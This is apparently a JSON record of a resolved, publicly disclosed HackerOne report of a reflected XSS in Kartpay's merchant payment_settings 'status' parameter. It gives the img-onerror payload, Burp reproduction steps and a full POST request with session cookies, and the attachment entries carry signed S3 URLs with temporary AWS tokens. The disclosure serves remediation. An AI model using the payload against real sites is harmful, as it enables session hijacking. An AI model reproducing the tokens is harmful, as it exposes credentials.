@@ -1,0 +1,142 @@
+{
+  "id": 643537,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NDM1Mzc=",
+  "url": "https://hackerone.com/reports/643537",
+  "title": "Reflected XSS on https://merchant.kartpay.com/payment_settings [status]",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2019-07-15T13:08:54.755Z",
+  "submitted_at": "2019-07-15T13:08:54.755Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "august1808",
+    "url": "/august1808",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/7cwlmx5977kjkx4f1fharlzb6o3b/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22925,
+    "url": "https://hackerone.com/kartpay",
+    "handle": "kartpay",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/925/d481af80adf6cd2b19449b09c785cb232f74eeba_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/925/d481af80adf6cd2b19449b09c785cb232f74eeba_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kartpay",
+      "twitter_handle": "",
+      "website": "http://Kartpay.com",
+      "about": "Kartpay is an Online Payment Gateway For Indian Region."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-08-28T15:27:54.390Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-08-12T14:33:36.275Z",
+  "team_member_agreed_on_going_public_at": "2019-08-28T15:27:54.153Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "#Vulnerable URL\nhttps://merchant.kartpay.com/payment_settings/type\n\n#Parameter\n``status``\n\n#Payload\n```\"><img src=x onerror=alert(domain)>```\n\n#Steps to Reproduce\n1. Login with your credentials.\n2. Go to https://merchant.kartpay.com/payment_settings\n3. Start Burp suite proxy and intercept on.\n4. Click on Run and Save button. intercept the request.\n5. Enter above payload in vulnerable parameter.\n6. Right click Show response in browser. \n7. You will notice that xss will execute. \n\n#POST Request\n\n```\nPOST /payment_settings/type HTTP/1.1\nHost: merchant.kartpay.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://merchant.kartpay.com/payment_settings\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CSRF-TOKEN: XGf5lqENEGvobu7MFdK2LfgtUoYZ2Hl6JWwYMLOV\nX-Requested-With: XMLHttpRequest\nContent-Length: 73\nConnection: close\nCookie: XSRF-TOKEN=eyJpdiI6IkIyMkNoakFhYVVpdmFtalJUc3JZWlE9PSIsInZhbHVlIjoiYTg1TlZFeUZLNzUxaVJoOXZyV1gxSWhZaEh5eTRuWENMRXJLR05tZGZMUVRUQ2ozTWgwbG1IMUlFZ0JxcVk5ZyIsIm1hYyI6IjNhZTI4ODM0YWY3YzM5N2JhZDEzMGE1NjdiODZhZWU4ZWM4YjI1ZjhjYmJhMWNhZGFlYTdkMmQ4OTRhMmRmNDcifQ%3D%3D; laravel_session=eyJpdiI6IlZuRkhIWmMxbFU2ZFArR3lVc1hFM1E9PSIsInZhbHVlIjoiXC9KSFZhVlV4YWpSNWR2YjlFS1F0STF5QTVYMTh3Y1ZNN1hWY2RhZnAxRFArXC9KT2FmUG01UldVR3dYTHdYWE03IiwibWFjIjoiOWMyYzJlY2MwYjY2NDkyMTkxZDhlOGE4Njk0N2QwYTdkNjFkMjRlZWNlNDBjNTc3MmZiYjg5YTI1Yjc4NTkxNiJ9; _ga=GA1.2.1275163119.1563193948; _gid=GA1.2.1455926951.1563193948\n\nmerchant_id=729&type_id=5&status=false\"><img src=x onerror=alert(cookie)>\n```\n{F529602}\n{F529603}\n{F529604}\n{F529605}\n\n## Impact\n\nwith the help of this attack, an attacker can execute malicious javascript on an application",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 529602,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/529/602/7b8989eef7a913203b6351e7e92a1812ad64e8b7/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGYXUPS3%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T145111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwIAvmOv4w%2B4UievyIjT9W9diCvrH4kfNWO8qEFYjlbwIhAPbbzN5sQ7g06VPALW0LiObnUDpFUEodUMbivgwErLB0KrEFCBYQAxoMMDEzNjE5Mjc0ODQ5IgxalQrWOaLbompCcQgqjgUsqIBUylMwN%2FnNcfkbd64VhlDbnlyGMHDkw3isEnWxpoUHAeIOkeS6Q9l6cDuV7hhXpBymFhcb9bp65SbsEb7j98UfZu4UmfsHSwazwJyYIhnhfgjxXae51nWR9j3nYOpjDvG5k1Z%2BUgTSry5AY7bqJDJ1lWdEVFGVX%2Ba%2FtIjSbYCLHEire8lIKDNWL6nt%2B5CTtVm4XoFurIkG3iVgu3SOQ5ayHYFUjHGngk3B3U2SoCdndOSOjV%2Bbls687WQGR9Pa317h7gMbugxjuDIfMVRWBZQxBALZjCaFDaPZO05HWfjOJ8y6dUfGp6LX860xVsfabVldWzhM5tRm%2Fwinjszwx7T4IIfeAYukeg7c0Bc%2BSDSy8gdeuoV20%2BO7CKjMId6Rpoka2bDT8w1dDlpCy5EOX%2BjRgsrNOpt7kPGOMQxpW%2FxSYtqBUGOnL9cw6TyDOmLYbN2rzxar7NNd3ecl9KLUQ277w0fC3vFZYIjjQRfA9%2BFLH6YLp%2FRAhwgaOMfW4icNf%2BXRitp8iHE9SgZmbxBzLzEGLFr%2BIdAmJfu5GzzLISD3ZuCCXMnLwz0H3frzCqmb0MGTA2Iv%2F9xDIkSVPugL3KZf9WVEwNWwxEwxMnrEC7BIqSOkc%2FPszAyKc43gTM%2B9RqHNGeTSOnDSkCqRtwV%2Bw0GXqn5KZM6jGmyxrxyJj3yZSXuAsO%2FQmFP%2BzaIgCFbyrO2fwfqjiHz1vdAJYhxj1WQ82bYxKcy4oqVfJQayQPtgExd%2Fqd85OauFvgP8O772S3BaZk4HTeXrqYnFOdOrKKfGhAAiVYRTXu%2BmQE9XBaqqQQAdy6Lfgr4mnpHWTUyr9ptoeBISbybyedw94rimQH1Cog6coBkwnn5Govcwieq%2FxgY6sAFc%2BfO0t7klqfy2jQRzyBYAzxL%2FknTvvj9qQ7OaUQN%2FwGNJ91rcj9Kjb%2BvgcRNykkQY3pQGfR5JAxgu7wxAAFzb9U91Zk7tW0XgwBUxmWGDHfNtxWtiTjpu0VqoJ8GlvaGjrC1Kr%2FrUjjDaRUPnXlRJdc3GcrRkEsXSFYvhoIyQslvMw%2B6r3SE%2BcWQqNXj0Org1zsR3g6v0jhhMCmVoKVJJroMdzQZFLaTLnS23pytPpA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=57cb9cfac970c08c8118822f5519de4a4bad2ef79cd7b0601a90b40c63b58c44",
+      "file_size": 108036,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 529603,
+      "file_name": "2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/529/603/4ec88c2d68083234bffbe539cbe7e2bbd705645b/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGYXUPS3%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T145111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwIAvmOv4w%2B4UievyIjT9W9diCvrH4kfNWO8qEFYjlbwIhAPbbzN5sQ7g06VPALW0LiObnUDpFUEodUMbivgwErLB0KrEFCBYQAxoMMDEzNjE5Mjc0ODQ5IgxalQrWOaLbompCcQgqjgUsqIBUylMwN%2FnNcfkbd64VhlDbnlyGMHDkw3isEnWxpoUHAeIOkeS6Q9l6cDuV7hhXpBymFhcb9bp65SbsEb7j98UfZu4UmfsHSwazwJyYIhnhfgjxXae51nWR9j3nYOpjDvG5k1Z%2BUgTSry5AY7bqJDJ1lWdEVFGVX%2Ba%2FtIjSbYCLHEire8lIKDNWL6nt%2B5CTtVm4XoFurIkG3iVgu3SOQ5ayHYFUjHGngk3B3U2SoCdndOSOjV%2Bbls687WQGR9Pa317h7gMbugxjuDIfMVRWBZQxBALZjCaFDaPZO05HWfjOJ8y6dUfGp6LX860xVsfabVldWzhM5tRm%2Fwinjszwx7T4IIfeAYukeg7c0Bc%2BSDSy8gdeuoV20%2BO7CKjMId6Rpoka2bDT8w1dDlpCy5EOX%2BjRgsrNOpt7kPGOMQxpW%2FxSYtqBUGOnL9cw6TyDOmLYbN2rzxar7NNd3ecl9KLUQ277w0fC3vFZYIjjQRfA9%2BFLH6YLp%2FRAhwgaOMfW4icNf%2BXRitp8iHE9SgZmbxBzLzEGLFr%2BIdAmJfu5GzzLISD3ZuCCXMnLwz0H3frzCqmb0MGTA2Iv%2F9xDIkSVPugL3KZf9WVEwNWwxEwxMnrEC7BIqSOkc%2FPszAyKc43gTM%2B9RqHNGeTSOnDSkCqRtwV%2Bw0GXqn5KZM6jGmyxrxyJj3yZSXuAsO%2FQmFP%2BzaIgCFbyrO2fwfqjiHz1vdAJYhxj1WQ82bYxKcy4oqVfJQayQPtgExd%2Fqd85OauFvgP8O772S3BaZk4HTeXrqYnFOdOrKKfGhAAiVYRTXu%2BmQE9XBaqqQQAdy6Lfgr4mnpHWTUyr9ptoeBISbybyedw94rimQH1Cog6coBkwnn5Govcwieq%2FxgY6sAFc%2BfO0t7klqfy2jQRzyBYAzxL%2FknTvvj9qQ7OaUQN%2FwGNJ91rcj9Kjb%2BvgcRNykkQY3pQGfR5JAxgu7wxAAFzb9U91Zk7tW0XgwBUxmWGDHfNtxWtiTjpu0VqoJ8GlvaGjrC1Kr%2FrUjjDaRUPnXlRJdc3GcrRkEsXSFYvhoIyQslvMw%2B6r3SE%2BcWQqNXj0Org1zsR3g6v0jhhMCmVoKVJJroMdzQZFLaTLnS23pytPpA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=74e1a1f80094e688b1c7f73ec20171e3b16252a54ca47c0c4682042938e45fc1",
+      "file_size": 140623,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 529604,
+      "file_name": "3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/529/604/d33db12ba35c33aa3851eea3614be04777a0a7f0/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGYXUPS3%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T145111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwIAvmOv4w%2B4UievyIjT9W9diCvrH4kfNWO8qEFYjlbwIhAPbbzN5sQ7g06VPALW0LiObnUDpFUEodUMbivgwErLB0KrEFCBYQAxoMMDEzNjE5Mjc0ODQ5IgxalQrWOaLbompCcQgqjgUsqIBUylMwN%2FnNcfkbd64VhlDbnlyGMHDkw3isEnWxpoUHAeIOkeS6Q9l6cDuV7hhXpBymFhcb9bp65SbsEb7j98UfZu4UmfsHSwazwJyYIhnhfgjxXae51nWR9j3nYOpjDvG5k1Z%2BUgTSry5AY7bqJDJ1lWdEVFGVX%2Ba%2FtIjSbYCLHEire8lIKDNWL6nt%2B5CTtVm4XoFurIkG3iVgu3SOQ5ayHYFUjHGngk3B3U2SoCdndOSOjV%2Bbls687WQGR9Pa317h7gMbugxjuDIfMVRWBZQxBALZjCaFDaPZO05HWfjOJ8y6dUfGp6LX860xVsfabVldWzhM5tRm%2Fwinjszwx7T4IIfeAYukeg7c0Bc%2BSDSy8gdeuoV20%2BO7CKjMId6Rpoka2bDT8w1dDlpCy5EOX%2BjRgsrNOpt7kPGOMQxpW%2FxSYtqBUGOnL9cw6TyDOmLYbN2rzxar7NNd3ecl9KLUQ277w0fC3vFZYIjjQRfA9%2BFLH6YLp%2FRAhwgaOMfW4icNf%2BXRitp8iHE9SgZmbxBzLzEGLFr%2BIdAmJfu5GzzLISD3ZuCCXMnLwz0H3frzCqmb0MGTA2Iv%2F9xDIkSVPugL3KZf9WVEwNWwxEwxMnrEC7BIqSOkc%2FPszAyKc43gTM%2B9RqHNGeTSOnDSkCqRtwV%2Bw0GXqn5KZM6jGmyxrxyJj3yZSXuAsO%2FQmFP%2BzaIgCFbyrO2fwfqjiHz1vdAJYhxj1WQ82bYxKcy4oqVfJQayQPtgExd%2Fqd85OauFvgP8O772S3BaZk4HTeXrqYnFOdOrKKfGhAAiVYRTXu%2BmQE9XBaqqQQAdy6Lfgr4mnpHWTUyr9ptoeBISbybyedw94rimQH1Cog6coBkwnn5Govcwieq%2FxgY6sAFc%2BfO0t7klqfy2jQRzyBYAzxL%2FknTvvj9qQ7OaUQN%2FwGNJ91rcj9Kjb%2BvgcRNykkQY3pQGfR5JAxgu7wxAAFzb9U91Zk7tW0XgwBUxmWGDHfNtxWtiTjpu0VqoJ8GlvaGjrC1Kr%2FrUjjDaRUPnXlRJdc3GcrRkEsXSFYvhoIyQslvMw%2B6r3SE%2BcWQqNXj0Org1zsR3g6v0jhhMCmVoKVJJroMdzQZFLaTLnS23pytPpA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=47ff1c2762db9ce47989af0997de979aeef98ca052b68e5da8facdcace026d07",
+      "file_size": 41818,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 529605,
+      "file_name": "4.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/529/605/89d17a70ff274a593e873c8326d0a654b1fc1423/4.png?response-content-disposition=attachment%3B%20filename%3D%224.png%22%3B%20filename%2A%3DUTF-8%27%274.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGYXUPS3%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T145111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwIAvmOv4w%2B4UievyIjT9W9diCvrH4kfNWO8qEFYjlbwIhAPbbzN5sQ7g06VPALW0LiObnUDpFUEodUMbivgwErLB0KrEFCBYQAxoMMDEzNjE5Mjc0ODQ5IgxalQrWOaLbompCcQgqjgUsqIBUylMwN%2FnNcfkbd64VhlDbnlyGMHDkw3isEnWxpoUHAeIOkeS6Q9l6cDuV7hhXpBymFhcb9bp65SbsEb7j98UfZu4UmfsHSwazwJyYIhnhfgjxXae51nWR9j3nYOpjDvG5k1Z%2BUgTSry5AY7bqJDJ1lWdEVFGVX%2Ba%2FtIjSbYCLHEire8lIKDNWL6nt%2B5CTtVm4XoFurIkG3iVgu3SOQ5ayHYFUjHGngk3B3U2SoCdndOSOjV%2Bbls687WQGR9Pa317h7gMbugxjuDIfMVRWBZQxBALZjCaFDaPZO05HWfjOJ8y6dUfGp6LX860xVsfabVldWzhM5tRm%2Fwinjszwx7T4IIfeAYukeg7c0Bc%2BSDSy8gdeuoV20%2BO7CKjMId6Rpoka2bDT8w1dDlpCy5EOX%2BjRgsrNOpt7kPGOMQxpW%2FxSYtqBUGOnL9cw6TyDOmLYbN2rzxar7NNd3ecl9KLUQ277w0fC3vFZYIjjQRfA9%2BFLH6YLp%2FRAhwgaOMfW4icNf%2BXRitp8iHE9SgZmbxBzLzEGLFr%2BIdAmJfu5GzzLISD3ZuCCXMnLwz0H3frzCqmb0MGTA2Iv%2F9xDIkSVPugL3KZf9WVEwNWwxEwxMnrEC7BIqSOkc%2FPszAyKc43gTM%2B9RqHNGeTSOnDSkCqRtwV%2Bw0GXqn5KZM6jGmyxrxyJj3yZSXuAsO%2FQmFP%2BzaIgCFbyrO2fwfqjiHz1vdAJYhxj1WQ82bYxKcy4oqVfJQayQPtgExd%2Fqd85OauFvgP8O772S3BaZk4HTeXrqYnFOdOrKKfGhAAiVYRTXu%2BmQE9XBaqqQQAdy6Lfgr4mnpHWTUyr9ptoeBISbybyedw94rimQH1Cog6coBkwnn5Govcwieq%2FxgY6sAFc%2BfO0t7klqfy2jQRzyBYAzxL%2FknTvvj9qQ7OaUQN%2FwGNJ91rcj9Kjb%2BvgcRNykkQY3pQGfR5JAxgu7wxAAFzb9U91Zk7tW0XgwBUxmWGDHfNtxWtiTjpu0VqoJ8GlvaGjrC1Kr%2FrUjjDaRUPnXlRJdc3GcrRkEsXSFYvhoIyQslvMw%2B6r3SE%2BcWQqNXj0Org1zsR3g6v0jhhMCmVoKVJJroMdzQZFLaTLnS23pytPpA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c47b4a8e4cc57894ac77611f681f8bd2e5751dc2e730f8e8dc4162abbfbaf2c0",
+      "file_size": 53645,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-09-11T14:33:36.486Z",
+  "allow_singular_disclosure_after": -190253855.22581178,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "bb00x",
+    "white_devil_6",
+    "thelilnix"
+  ],
+  "structured_scope": {
+    "databaseId": 3965,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.kartpay.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
